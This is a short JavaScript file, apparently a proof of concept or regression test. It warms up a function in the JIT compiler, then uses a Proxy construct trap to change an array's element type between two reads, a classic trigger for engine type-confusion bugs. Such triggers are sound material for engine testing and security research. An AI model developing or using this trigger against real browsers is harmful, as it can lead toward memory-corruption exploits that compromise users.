function foo(a, p) {
    a[0];
    new p();
    return a[0];
}

let side_effect_array = [1337];
let trigger = false;

const handler = {
    construct: function(target, args) {
        if (trigger) {
            side_effect_array[0] = 1.1;
        }
        return {};
    }
};

const proxy_target = new Proxy(function() {}, handler);

for (let i = 0; i < 25000; ++i) {
    foo(side_effect_array, proxy_target);
}

trigger = true;
foo(side_effect_array, proxy_target);
